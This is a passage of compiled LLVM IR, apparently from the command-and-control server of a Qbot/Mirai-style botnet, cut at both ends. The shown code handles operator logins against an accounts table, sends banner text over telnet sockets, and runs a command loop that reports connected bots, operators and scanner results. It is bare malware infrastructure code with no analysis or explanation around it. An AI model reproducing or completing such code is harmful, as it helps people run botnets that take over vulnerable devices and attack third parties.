  %179 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %180 = load i32, i32* %5, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %181
  %183 = getelementptr inbounds %struct.login_info, %struct.login_info* %182, i32 0, i32 1
  %184 = getelementptr inbounds [100 x i8], [100 x i8]* %183, i64 0, i64 0
  %185 = call i32 @strcmp(i8* %179, i8* %184) #8
  %186 = icmp ne i32 %185, 0
  br i1 %186, label %187, label %188

187:                                              ; preds = %177
  br label %319

188:                                              ; preds = %177
  %189 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %189, i8 0, i64 2048, i1 false)
  %190 = getelementptr inbounds [500 x i8], [500 x i8]* %21, i64 0, i64 0
  %191 = load i32, i32* %5, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %192
  %194 = getelementptr inbounds %struct.login_info, %struct.login_info* %193, i32 0, i32 0
  %195 = getelementptr inbounds [100 x i8], [100 x i8]* %194, i64 0, i64 0
  %196 = call i32 (i8*, i8*, ...) @sprintf(i8* %190, i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.22, i64 0, i64 0), i8* %195) #9
  %197 = getelementptr inbounds [500 x i8], [500 x i8]* %22, i64 0, i64 0
  %198 = load i32, i32* %5, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %199
  %201 = getelementptr inbounds %struct.login_info, %struct.login_info* %200, i32 0, i32 0
  %202 = getelementptr inbounds [100 x i8], [100 x i8]* %201, i64 0, i64 0
  %203 = call i32 (i8*, i8*, ...) @sprintf(i8* %197, i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.23, i64 0, i64 0), i8* %202) #9
  %204 = getelementptr inbounds [500 x i8], [500 x i8]* %23, i64 0, i64 0
  %205 = load i32, i32* %5, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %206
  %208 = getelementptr inbounds %struct.login_info, %struct.login_info* %207, i32 0, i32 0
  %209 = getelementptr inbounds [100 x i8], [100 x i8]* %208, i64 0, i64 0
  %210 = call i32 (i8*, i8*, ...) @sprintf(i8* %204, i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.24, i64 0, i64 0), i8* %209) #9
  %211 = getelementptr inbounds [500 x i8], [500 x i8]* %24, i64 0, i64 0
  %212 = load i32, i32* %5, align 4
  %213 = sext i32 %212 to i64
  %214 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %213
  %215 = getelementptr inbounds %struct.login_info, %struct.login_info* %214, i32 0, i32 0
  %216 = getelementptr inbounds [100 x i8], [100 x i8]* %215, i64 0, i64 0
  %217 = call i32 (i8*, i8*, ...) @sprintf(i8* %211, i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.23, i64 0, i64 0), i8* %216) #9
  %218 = getelementptr inbounds [500 x i8], [500 x i8]* %25, i64 0, i64 0
  %219 = load i32, i32* %5, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %220
  %222 = getelementptr inbounds %struct.login_info, %struct.login_info* %221, i32 0, i32 0
  %223 = getelementptr inbounds [100 x i8], [100 x i8]* %222, i64 0, i64 0
  %224 = call i32 (i8*, i8*, ...) @sprintf(i8* %218, i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.24, i64 0, i64 0), i8* %223) #9
  %225 = load i32, i32* %4, align 4
  %226 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %227 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %228 = call i64 @strlen(i8* %227) #8
  %229 = call i64 @send(i32 %225, i8* %226, i64 %228, i32 16384)
  %230 = icmp eq i64 %229, -1
  br i1 %230, label %231, label %232

231:                                              ; preds = %188
  br label %913

232:                                              ; preds = %188
  %233 = load i32, i32* %4, align 4
  %234 = getelementptr inbounds [500 x i8], [500 x i8]* %21, i64 0, i64 0
  %235 = getelementptr inbounds [500 x i8], [500 x i8]* %21, i64 0, i64 0
  %236 = call i64 @strlen(i8* %235) #8
  %237 = call i64 @send(i32 %233, i8* %234, i64 %236, i32 16384)
  %238 = icmp eq i64 %237, -1
  br i1 %238, label %239, label %240

239:                                              ; preds = %232
  br label %913

240:                                              ; preds = %232
  %241 = call i32 @sleep(i32 1)
  %242 = load i32, i32* %4, align 4
  %243 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %244 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %245 = call i64 @strlen(i8* %244) #8
  %246 = call i64 @send(i32 %242, i8* %243, i64 %245, i32 16384)
  %247 = icmp eq i64 %246, -1
  br i1 %247, label %248, label %249

248:                                              ; preds = %240
  br label %913

249:                                              ; preds = %240
  %250 = load i32, i32* %4, align 4
  %251 = getelementptr inbounds [500 x i8], [500 x i8]* %22, i64 0, i64 0
  %252 = getelementptr inbounds [500 x i8], [500 x i8]* %22, i64 0, i64 0
  %253 = call i64 @strlen(i8* %252) #8
  %254 = call i64 @send(i32 %250, i8* %251, i64 %253, i32 16384)
  %255 = icmp eq i64 %254, -1
  br i1 %255, label %256, label %257

256:                                              ; preds = %249
  br label %913

257:                                              ; preds = %249
  %258 = call i32 @sleep(i32 1)
  %259 = load i32, i32* %4, align 4
  %260 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %261 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %262 = call i64 @strlen(i8* %261) #8
  %263 = call i64 @send(i32 %259, i8* %260, i64 %262, i32 16384)
  %264 = icmp eq i64 %263, -1
  br i1 %264, label %265, label %266

265:                                              ; preds = %257
  br label %913

266:                                              ; preds = %257
  %267 = load i32, i32* %4, align 4
  %268 = getelementptr inbounds [500 x i8], [500 x i8]* %23, i64 0, i64 0
  %269 = getelementptr inbounds [500 x i8], [500 x i8]* %23, i64 0, i64 0
  %270 = call i64 @strlen(i8* %269) #8
  %271 = call i64 @send(i32 %267, i8* %268, i64 %270, i32 16384)
  %272 = icmp eq i64 %271, -1
  br i1 %272, label %273, label %274

273:                                              ; preds = %266
  br label %913

274:                                              ; preds = %266
  %275 = call i32 @sleep(i32 1)
  %276 = load i32, i32* %4, align 4
  %277 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %278 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %279 = call i64 @strlen(i8* %278) #8
  %280 = call i64 @send(i32 %276, i8* %277, i64 %279, i32 16384)
  %281 = icmp eq i64 %280, -1
  br i1 %281, label %282, label %283

282:                                              ; preds = %274
  br label %913

283:                                              ; preds = %274
  %284 = load i32, i32* %4, align 4
  %285 = getelementptr inbounds [500 x i8], [500 x i8]* %24, i64 0, i64 0
  %286 = getelementptr inbounds [500 x i8], [500 x i8]* %24, i64 0, i64 0
  %287 = call i64 @strlen(i8* %286) #8
  %288 = call i64 @send(i32 %284, i8* %285, i64 %287, i32 16384)
  %289 = icmp eq i64 %288, -1
  br i1 %289, label %290, label %291

290:                                              ; preds = %283
  br label %913

291:                                              ; preds = %283
  %292 = call i32 @sleep(i32 1)
  %293 = load i32, i32* %4, align 4
  %294 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %295 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %296 = call i64 @strlen(i8* %295) #8
  %297 = call i64 @send(i32 %293, i8* %294, i64 %296, i32 16384)
  %298 = icmp eq i64 %297, -1
  br i1 %298, label %299, label %300

299:                                              ; preds = %291
  br label %913

300:                                              ; preds = %291
  %301 = load i32, i32* %4, align 4
  %302 = getelementptr inbounds [500 x i8], [500 x i8]* %25, i64 0, i64 0
  %303 = getelementptr inbounds [500 x i8], [500 x i8]* %25, i64 0, i64 0
  %304 = call i64 @strlen(i8* %303) #8
  %305 = call i64 @send(i32 %301, i8* %302, i64 %304, i32 16384)
  %306 = icmp eq i64 %305, -1
  br i1 %306, label %307, label %308

307:                                              ; preds = %300
  br label %913

308:                                              ; preds = %300
  %309 = call i32 @sleep(i32 1)
  %310 = load i32, i32* %4, align 4
  %311 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %312 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %313 = call i64 @strlen(i8* %312) #8
  %314 = call i64 @send(i32 %310, i8* %311, i64 %313, i32 16384)
  %315 = icmp eq i64 %314, -1
  br i1 %315, label %316, label %317

316:                                              ; preds = %308
  br label %913

317:                                              ; preds = %308
  br label %325

318:                                              ; preds = %128
  br label %319

319:                                              ; preds = %318, %187
  %320 = load i32, i32* %4, align 4
  %321 = call i64 @send(i32 %320, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.18, i64 0, i64 0), i64 5, i32 16384)
  %322 = icmp eq i64 %321, -1
  br i1 %322, label %323, label %324

323:                                              ; preds = %319
  br label %913

324:                                              ; preds = %319
  br label %913

325:                                              ; preds = %317
  %326 = load i8*, i8** %3, align 8
  %327 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %326) #9
  %328 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %329 = call i32 (i8*, i8*, ...) @sprintf(i8* %328, i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.25, i64 0, i64 0)) #9
  %330 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %331 = call i32 (i8*, i8*, ...) @sprintf(i8* %330, i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.26, i64 0, i64 0)) #9
  %332 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %333 = call i32 (i8*, i8*, ...) @sprintf(i8* %332, i8* getelementptr inbounds ([96 x i8], [96 x i8]* @.str.27, i64 0, i64 0)) #9
  %334 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %335 = call i32 (i8*, i8*, ...) @sprintf(i8* %334, i8* getelementptr inbounds ([96 x i8], [96 x i8]* @.str.28, i64 0, i64 0)) #9
  %336 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %337 = call i32 (i8*, i8*, ...) @sprintf(i8* %336, i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.29, i64 0, i64 0)) #9
  %338 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %339 = call i32 (i8*, i8*, ...) @sprintf(i8* %338, i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.30, i64 0, i64 0)) #9
  %340 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i64 0, i64 0
  %341 = call i32 (i8*, i8*, ...) @sprintf(i8* %340, i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.31, i64 0, i64 0)) #9
  %342 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i64 0, i64 0
  %343 = call i32 (i8*, i8*, ...) @sprintf(i8* %342, i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.32, i64 0, i64 0)) #9
  %344 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i64 0, i64 0
  %345 = call i32 (i8*, i8*, ...) @sprintf(i8* %344, i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.33, i64 0, i64 0)) #9
  %346 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i64 0, i64 0
  %347 = call i32 (i8*, i8*, ...) @sprintf(i8* %346, i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.34, i64 0, i64 0)) #9
  %348 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i64 0, i64 0
  %349 = call i32 (i8*, i8*, ...) @sprintf(i8* %348, i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.35, i64 0, i64 0)) #9
  %350 = getelementptr inbounds [5000 x i8], [5000 x i8]* %37, i64 0, i64 0
  %351 = call i32 (i8*, i8*, ...) @sprintf(i8* %350, i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.36, i64 0, i64 0)) #9
  %352 = getelementptr inbounds [5000 x i8], [5000 x i8]* %38, i64 0, i64 0
  %353 = call i32 (i8*, i8*, ...) @sprintf(i8* %352, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.37, i64 0, i64 0)) #9
  %354 = load i32, i32* %4, align 4
  %355 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %356 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %357 = call i64 @strlen(i8* %356) #8
  %358 = call i64 @send(i32 %354, i8* %355, i64 %357, i32 16384)
  %359 = icmp eq i64 %358, -1
  br i1 %359, label %360, label %361

360:                                              ; preds = %325
  br label %913

361:                                              ; preds = %325
  %362 = load i32, i32* %4, align 4
  %363 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %364 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %365 = call i64 @strlen(i8* %364) #8
  %366 = call i64 @send(i32 %362, i8* %363, i64 %365, i32 16384)
  %367 = icmp eq i64 %366, -1
  br i1 %367, label %368, label %369

368:                                              ; preds = %361
  br label %913

369:                                              ; preds = %361
  %370 = load i32, i32* %4, align 4
  %371 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %372 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %373 = call i64 @strlen(i8* %372) #8
  %374 = call i64 @send(i32 %370, i8* %371, i64 %373, i32 16384)
  %375 = icmp eq i64 %374, -1
  br i1 %375, label %376, label %377

376:                                              ; preds = %369
  br label %913

377:                                              ; preds = %369
  %378 = load i32, i32* %4, align 4
  %379 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %380 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %381 = call i64 @strlen(i8* %380) #8
  %382 = call i64 @send(i32 %378, i8* %379, i64 %381, i32 16384)
  %383 = icmp eq i64 %382, -1
  br i1 %383, label %384, label %385

384:                                              ; preds = %377
  br label %913

385:                                              ; preds = %377
  %386 = load i32, i32* %4, align 4
  %387 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %388 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %389 = call i64 @strlen(i8* %388) #8
  %390 = call i64 @send(i32 %386, i8* %387, i64 %389, i32 16384)
  %391 = icmp eq i64 %390, -1
  br i1 %391, label %392, label %393

392:                                              ; preds = %385
  br label %913

393:                                              ; preds = %385
  %394 = load i32, i32* %4, align 4
  %395 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %396 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %397 = call i64 @strlen(i8* %396) #8
  %398 = call i64 @send(i32 %394, i8* %395, i64 %397, i32 16384)
  %399 = icmp eq i64 %398, -1
  br i1 %399, label %400, label %401

400:                                              ; preds = %393
  br label %913

401:                                              ; preds = %393
  %402 = load i32, i32* %4, align 4
  %403 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i64 0, i64 0
  %404 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i64 0, i64 0
  %405 = call i64 @strlen(i8* %404) #8
  %406 = call i64 @send(i32 %402, i8* %403, i64 %405, i32 16384)
  %407 = icmp eq i64 %406, -1
  br i1 %407, label %408, label %409

408:                                              ; preds = %401
  br label %913

409:                                              ; preds = %401
  %410 = load i32, i32* %4, align 4
  %411 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i64 0, i64 0
  %412 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i64 0, i64 0
  %413 = call i64 @strlen(i8* %412) #8
  %414 = call i64 @send(i32 %410, i8* %411, i64 %413, i32 16384)
  %415 = icmp eq i64 %414, -1
  br i1 %415, label %416, label %417

416:                                              ; preds = %409
  br label %913

417:                                              ; preds = %409
  %418 = load i32, i32* %4, align 4
  %419 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i64 0, i64 0
  %420 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i64 0, i64 0
  %421 = call i64 @strlen(i8* %420) #8
  %422 = call i64 @send(i32 %418, i8* %419, i64 %421, i32 16384)
  %423 = icmp eq i64 %422, -1
  br i1 %423, label %424, label %425

424:                                              ; preds = %417
  br label %913

425:                                              ; preds = %417
  %426 = load i32, i32* %4, align 4
  %427 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i64 0, i64 0
  %428 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i64 0, i64 0
  %429 = call i64 @strlen(i8* %428) #8
  %430 = call i64 @send(i32 %426, i8* %427, i64 %429, i32 16384)
  %431 = icmp eq i64 %430, -1
  br i1 %431, label %432, label %433

432:                                              ; preds = %425
  br label %913

433:                                              ; preds = %425
  %434 = load i32, i32* %4, align 4
  %435 = getelementptr inbounds [5000 x i8], [5000 x i8]* %37, i64 0, i64 0
  %436 = getelementptr inbounds [5000 x i8], [5000 x i8]* %37, i64 0, i64 0
  %437 = call i64 @strlen(i8* %436) #8
  %438 = call i64 @send(i32 %434, i8* %435, i64 %437, i32 16384)
  %439 = icmp eq i64 %438, -1
  br i1 %439, label %440, label %441

440:                                              ; preds = %433
  br label %913

441:                                              ; preds = %433
  %442 = load i32, i32* %4, align 4
  %443 = getelementptr inbounds [5000 x i8], [5000 x i8]* %38, i64 0, i64 0
  %444 = getelementptr inbounds [5000 x i8], [5000 x i8]* %38, i64 0, i64 0
  %445 = call i64 @strlen(i8* %444) #8
  %446 = call i64 @send(i32 %442, i8* %443, i64 %445, i32 16384)
  %447 = icmp eq i64 %446, -1
  br i1 %447, label %448, label %449

448:                                              ; preds = %441
  br label %913

449:                                              ; preds = %441
  br label %450

450:                                              ; preds = %449
  %451 = getelementptr inbounds [5000 x i8], [5000 x i8]* %39, i64 0, i64 0
  %452 = load i32, i32* %5, align 4
  %453 = sext i32 %452 to i64
  %454 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %453
  %455 = getelementptr inbounds %struct.login_info, %struct.login_info* %454, i32 0, i32 0
  %456 = getelementptr inbounds [100 x i8], [100 x i8]* %455, i64 0, i64 0
  %457 = call i32 (i8*, i8*, ...) @sprintf(i8* %451, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.38, i64 0, i64 0), i8* %456) #9
  %458 = load i32, i32* %4, align 4
  %459 = getelementptr inbounds [5000 x i8], [5000 x i8]* %39, i64 0, i64 0
  %460 = getelementptr inbounds [5000 x i8], [5000 x i8]* %39, i64 0, i64 0
  %461 = call i64 @strlen(i8* %460) #8
  %462 = call i64 @send(i32 %458, i8* %459, i64 %461, i32 16384)
  %463 = icmp eq i64 %462, -1
  br i1 %463, label %464, label %465

464:                                              ; preds = %450
  br label %913

465:                                              ; preds = %450
  br label %466

466:                                              ; preds = %465
  %467 = load i8*, i8** %3, align 8
  %468 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %467) #9
  %469 = load i32, i32* %4, align 4
  %470 = sext i32 %469 to i64
  %471 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %470
  %472 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %471, i32 0, i32 0
  store i32 1, i32* %472, align 4
  br label %473

473:                                              ; preds = %879, %878, %835, %714, %679, %605, %531, %466
  %474 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %475 = load i32, i32* %4, align 4
  %476 = call i32 @fdgets(i8* %474, i32 2048, i32 %475)
  %477 = icmp sgt i32 %476, 0
  br i1 %477, label %478, label %912

478:                                              ; preds = %473
  %479 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %480 = call i8* @strstr(i8* %479, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.39, i64 0, i64 0)) #8
  %481 = icmp ne i8* %480, null
  br i1 %481, label %482, label %532

482:                                              ; preds = %478
  %483 = getelementptr inbounds [2048 x i8], [2048 x i8]* %40, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %483, i8 0, i64 2048, i1 false)
  %484 = getelementptr inbounds [2048 x i8], [2048 x i8]* %41, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %484, i8 0, i64 2048, i1 false)
  %485 = getelementptr inbounds [2048 x i8], [2048 x i8]* %40, i64 0, i64 0
  %486 = call i32 @BotsConnected()
  %487 = load volatile i32, i32* @OperatorsConnected, align 4
  %488 = call i32 (i8*, i8*, ...) @sprintf(i8* %485, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.40, i64 0, i64 0), i32 %486, i32 %487) #9
  %489 = getelementptr inbounds [2048 x i8], [2048 x i8]* %42, i64 0, i64 0
  %490 = load volatile i32, i32* @OperatorsConnected, align 4
  %491 = load volatile i32, i32* @scannerreport, align 4
  %492 = call i32 (i8*, i8*, ...) @sprintf(i8* %489, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.41, i64 0, i64 0), i32 %490, i32 %491) #9
  %493 = load i32, i32* %4, align 4
  %494 = getelementptr inbounds [2048 x i8], [2048 x i8]* %40, i64 0, i64 0
  %495 = getelementptr inbounds [2048 x i8], [2048 x i8]* %40, i64 0, i64 0
  %496 = call i64 @strlen(i8* %495) #8
  %497 = call i64 @send(i32 %493, i8* %494, i64 %496, i32 16384)
  %498 = icmp eq i64 %497, -1
  br i1 %498, label %499, label %500

499:                                              ; preds = %482
  store i8* null, i8** %2, align 8
  br label %922

500:                                              ; preds = %482
  %501 = load i32, i32* %4, align 4
  %502 = getelementptr inbounds [2048 x i8], [2048 x i8]* %41, i64 0, i64 0
  %503 = getelementptr inbounds [2048 x i8], [2048 x i8]* %41, i64 0, i64 0
  %504 = call i64 @strlen(i8* %503) #8
  %505 = call i64 @send(i32 %501, i8* %502, i64 %504, i32 16384)
  %506 = icmp eq i64 %505, -1
  br i1 %506, label %507, label %508

507:                                              ; preds = %500
  store i8* null, i8** %2, align 8
  br label %922

508:                                              ; preds = %500
  %509 = load i32, i32* %4, align 4
  %510 = getelementptr inbounds [2048 x i8], [2048 x i8]* %42, i64 0, i64 0
  %511 = getelementptr inbounds [2048 x i8], [2048 x i8]* %42, i64 0, i64 0
  %512 = call i64 @strlen(i8* %511) #8
  %513 = call i64 @send(i32 %509, i8* %510, i64 %512, i32 16384)
  %514 = icmp eq i64 %513, -1
  br i1 %514, label %515, label %516

515:                                              ; preds = %508
  store i8* null, i8** %2, align 8
  br label %922

516:                                              ; preds = %508
  %517 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i64 0, i64 0
  %518 = load i32, i32* %5, align 4
  %519 = sext i32 %518 to i64
  %520 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %519
  %521 = getelementptr inbounds %struct.login_info, %struct.login_info* %520, i32 0, i32 0
  %522 = getelementptr inbounds [100 x i8], [100 x i8]* %521, i64 0, i64 0
  %523 = call i32 (i8*, i8*, ...) @sprintf(i8* %517, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.38, i64 0, i64 0), i8* %522) #9
  %524 = load i32, i32* %4, align 4
  %525 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i64 0, i64 0
  %526 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i64 0, i64 0
  %527 = call i64 @strlen(i8* %526) #8
  %528 = call i64 @send(i32 %524, i8* %525, i64 %527, i32 16384)
  %529 = icmp eq i64 %528, -1
  br i1 %529, label %530, label %531

530:                                              ; preds = %516
  br label %913

531:                                              ; preds = %516
  br label %473, !llvm.loop !19

532:                                              ; preds = %478
  %533 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %534 = call i8* @strstr(i8* %533, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.42, i64 0, i64 0)) #8
  %535 = icmp ne i8* %534, null
  br i1 %535, label %536, label %606

536:                                              ; preds = %532
  %537 = load i8*, i8** %3, align 8
  %538 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %537) #9
  %539 = getelementptr inbounds [800 x i8], [800 x i8]* %44, i64 0, i64 0
  %540 = call i32 (i8*, i8*, ...) @sprintf(i8* %539, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.43, i64 0, i64 0)) #9
  %541 = getelementptr inbounds [800 x i8], [800 x i8]* %45, i64 0, i64 0
  %542 = call i32 (i8*, i8*, ...) @sprintf(i8* %541, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.44, i64 0, i64 0)) #9
  %543 = getelementptr inbounds [800 x i8], [800 x i8]* %46, i64 0, i64 0
  %544 = call i32 (i8*, i8*, ...) @sprintf(i8* %543, i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.45, i64 0, i64 0)) #9
  %545 = getelementptr inbounds [800 x i8], [800 x i8]* %47, i64 0, i64 0
  %546 = call i32 (i8*, i8*, ...) @sprintf(i8* %545, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.46, i64 0, i64 0)) #9
  %547 = getelementptr inbounds [800 x i8], [800 x i8]* %48, i64 0, i64 0
  %548 = call i32 (i8*, i8*, ...) @sprintf(i8* %547, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.47, i64 0, i64 0)) #9
  %549 = load i32, i32* %4, align 4
  %550 = getelementptr inbounds [800 x i8], [800 x i8]* %44, i64 0, i64 0
  %551 = getelementptr inbounds [800 x i8], [800 x i8]* %44, i64 0, i64 0
  %552 = call i64 @strlen(i8* %551) #8
  %553 = call i64 @send(i32 %549, i8* %550, i64 %552, i32 16384)
  %554 = icmp eq i64 %553, -1
  br i1 %554, label %555, label %556

555:                                              ; preds = %536
  br label %913

556:                                              ; preds = %536
  %557 = load i32, i32* %4, align 4
  %558 = getelementptr inbounds [800 x i8], [800 x i8]* %45, i64 0, i64 0
  %559 = getelementptr inbounds [800 x i8], [800 x i8]* %45, i64 0, i64 0
  %560 = call i64 @strlen(i8* %559) #8
  %561 = call i64 @send(i32 %557, i8* %558, i64 %560, i32 16384)
  %562 = icmp eq i64 %561, -1
  br i1 %562, label %563, label %564

563:                                              ; preds = %556
  br label %913

564:                                              ; preds = %556
  %565 = load i32, i32* %4, align 4
  %566 = getelementptr inbounds [800 x i8], [800 x i8]* %46, i64 0, i64 0
  %567 = getelementptr inbounds [800 x i8], [800 x i8]* %46, i64 0, i64 0
  %568 = call i64 @strlen(i8* %567) #8
  %569 = call i64 @send(i32 %565, i8* %566, i64 %568, i32 16384)
  %570 = icmp eq i64 %569, -1
  br i1 %570, label %571, label %572

571:                                              ; preds = %564
  br label %913

572:                                              ; preds = %564
  %573 = load i32, i32* %4, align 4
  %574 = getelementptr inbounds [800 x i8], [800 x i8]* %47, i64 0, i64 0
  %575 = getelementptr inbounds [800 x i8], [800 x i8]* %47, i64 0, i64 0
  %576 = call i64 @strlen(i8* %575) #8
  %577 = call i64 @send(i32 %573, i8* %574, i64 %576, i32 16384)
  %578 = icmp eq i64 %577, -1
  br i1 %578, label %579, label %580

579:                                              ; preds = %572
  br label %913

580:                                              ; preds = %572
  %581 = load i32, i32* %4, align 4
  %582 = getelementptr inbounds [800 x i8], [800 x i8]* %48, i64 0, i64 0
  %583 = getelementptr inbounds [800 x i8], [800 x i8]* %48, i64 0, i64 0
  %584 = call i64 @strlen(i8* %583) #8
  %585 = call i64 @send(i32 %581, i8* %582, i64 %584, i32 16384)
  %586 = icmp eq i64 %585, -1
  br i1 %586, label %587, label %588

587:                                              ; preds = %580
  br label %913

588:                                              ; preds = %580
  %589 = load i8*, i8** %3, align 8
  %590 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %589) #9
  %591 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i64 0, i64 0
  %592 = load i32, i32* %5, align 4
  %593 = sext i32 %592 to i64
  %594 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %593
  %595 = getelementptr inbounds %struct.login_info, %struct.login_info* %594, i32 0, i32 0
  %596 = getelementptr inbounds [100 x i8], [100 x i8]* %595, i64 0, i64 0
  %597 = call i32 (i8*, i8*, ...) @sprintf(i8* %591, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.38, i64 0, i64 0), i8* %596) #9
  %598 = load i32, i32* %4, align 4
  %599 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i64 0, i64 0
  %600 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i64 0, i64 0
  %601 = call i64 @strlen(i8* %600) #8
  %602 = call i64 @send(i32 %598, i8* %599, i64 %601, i32 16384)
  %603 = icmp eq i64 %602, -1
  br i1 %603, label %604, label %605

604:                                              ; preds = %588
  br label %913

605:                                              ; preds = %588
